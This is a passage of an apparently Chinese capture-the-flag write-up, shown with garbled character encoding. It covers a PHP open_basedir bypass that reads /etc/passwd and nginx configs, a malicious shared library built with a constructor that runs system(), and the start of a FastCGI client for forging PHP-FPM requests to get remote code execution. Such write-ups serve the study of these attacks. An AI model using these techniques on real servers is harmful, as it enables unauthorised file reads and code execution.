function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>è¯»å–php.ini</p><p><code> /usr/local/etc/php/php.ini</code></p><img src="/article/bluehat2021/image-20210503140055221.png" class="" title="ext" loading="lazy"><p>å‘ç°å¼‚å¸¸.soæ–‡ä»¶ï¼Œå¯èƒ½æ˜¯è¦åŠ è½½ç„¶åpwnå®ƒï¼Œå®åœ¨ä¸ä¼šã€‚</p><h3 id="è¯»å–é…ç½®æ–‡ä»¶"><a href="#è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="è¯»å–é…ç½®æ–‡ä»¶"></a>è¯»å–é…ç½®æ–‡ä»¶</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// normal files</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"glob:///etc/nginx/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$f</span><span class="token punctuation">&#125;</span></span>&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¯»<code>/etc/nginx/nginx.conf</code>ï¼Œå‘ç°æœ‰<code>include /etc/nginx/sites-enabled/*;</code></p><p>è½¬å¤´è¯»å–<code>/etc/nginx/sites-enabled/default</code></p><img src="/article/bluehat2021/image-20210503142114737.png" class="" title="cgi" loading="lazy"><p>å‘ç°åœ¨9001ç«¯å£å¼€æœ‰FastCGIæœåŠ¡ï¼Œphpinfoä¸­ä¹Ÿè¡¨æ˜è¯¥é¡¹ç›®ä¸ºFPM/FastCGIï¼Œå¯ä»¥é€šè¿‡æœªæˆæƒæ‰“FPM rce</p><img src="/article/bluehat2021/image-20210503141634940.png" class="" title="phpinfo" loading="lazy"><h3 id="åŠ è½½æ¶æ„soæ–‡ä»¶"><a href="#åŠ è½½æ¶æ„soæ–‡ä»¶" class="headerlink" title="åŠ è½½æ¶æ„soæ–‡ä»¶"></a>åŠ è½½æ¶æ„soæ–‡ä»¶</h3><p>å†™.soæ‰©å±•</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / >/var/www/html/a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><small>å°æ’æ›²ï¼šè¿™é‡Œå‘ç°è¾“å‡ºåˆ°<code>/var/www/html/1</code>å‘ç°ä¸è¡Œï¼Œç»“æœåå­—æ¢æˆaå°±å¯äº†ï¼Œç¦»è°±</small></p><p>ç¼–è¯‘ä¸‹</p><pre class="language-none"><code class="language-none">gcc hpdoger.c -fPIC -shared -o hpdoger.so</code></pre><p>æ³¨æ„çš„æ˜¯ç”¨macoså’Œlinuxç¼–è¯‘æ˜¯ä¸åŒçš„ï¼Œå¾—ç”¨linuxç¼–è¯‘ï¼Œç¼–è¯‘å®Œåä¸Šä¼ è‡³<code>/var/www/html</code></p><h3 id="ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI"><a href="#ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI" class="headerlink" title="ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI"></a>ä¼ªé€ FastCGIè¯·æ±‚PHP-CGI</h3><p>åŒæ ·å†™åœ¨htmlç›®å½•</p><blockquote><p>ç”¨æˆ·è®¿é—®<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>ï¼Œå¦‚æœwebç›®å½•æ˜¯/var/www/htmlï¼Œé‚£ä¹ˆNginxä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹key-valueå¯¹ï¼š</p><blockquote><p>{<br>â€˜GATEWAY_INTERFACEâ€™: â€˜FastCGI/1.0â€™,<br>â€˜REQUEST_METHODâ€™: â€˜GETâ€™,<br>â€˜SCRIPT_FILENAMEâ€™: â€˜/var/www/html/index.phpâ€™,<br>â€˜SCRIPT_NAMEâ€™: â€˜/index.phpâ€™,<br>â€˜QUERY_STRINGâ€™: â€˜?a=1&amp;b=2â€™,<br>â€˜REQUEST_URIâ€™: â€˜/index.php?a=1&amp;b=2â€™,<br>â€˜DOCUMENT_ROOTâ€™: â€˜/var/www/htmlâ€™,<br>â€˜SERVER_SOFTWAREâ€™: â€˜php/fcgiclientâ€™,<br>â€˜REMOTE_ADDRâ€™: â€˜127.0.0.1â€™,<br>â€˜REMOTE_PORTâ€™: â€˜12345â€™,<br>â€˜SERVER_ADDRâ€™: â€˜127.0.0.1â€™,<br>â€˜SERVER_PORTâ€™: â€˜80â€™,<br>â€˜SERVER_NAMEâ€™: â€œlocalhostâ€,<br>â€˜SERVER_PROTOCOLâ€™: â€˜HTTP/1.1â€™<br>}</p></blockquote></blockquote><ul><li>é€šè¿‡åœ¨FastCGIåè®®ä¿®æ”¹PHP_VALUEå­—æ®µè¿›è€Œä¿®æ”¹php.iniä¸­çš„ä¸€äº›è®¾ç½®ï¼Œè€Œopen_basedir åŒæ ·å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•è¿›è¡Œè®¾ç½®ã€‚æ¯”å¦‚ï¼š<code>$php_value = &quot;open_basedir = /&quot;;</code></li><li>å› ä¸ºFPMæ²¡æœ‰åˆ¤æ–­è¯·æ±‚çš„æ¥æºæ˜¯å¦å¿…é¡»æ¥è‡ªWebserverã€‚æ ¹æ®PHPè§£æå™¨çš„æµç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ FastCGIå‘FPMå‘èµ·è¯·æ±‚ï¼ŒPHP_VALUEç›¸å½“äºæ”¹å˜.iniä¸­çš„è®¾ç½®ï¼Œè¦†ç›–äº†æœ¬èº«çš„open_basedir</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span>         <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span>            <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span>             <span class="token operator">=</span> <span class="token single-quoted-string string">'MAX_REQS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span>           <span class="token operator">=</span> <span class="token single-quoted-string string">'MPXS_CONNS'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span>           <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Socket     * @var Resource     */</span>    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Host     * @var String     */</span>    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span>boolean<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">></span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">8</span><span class="token 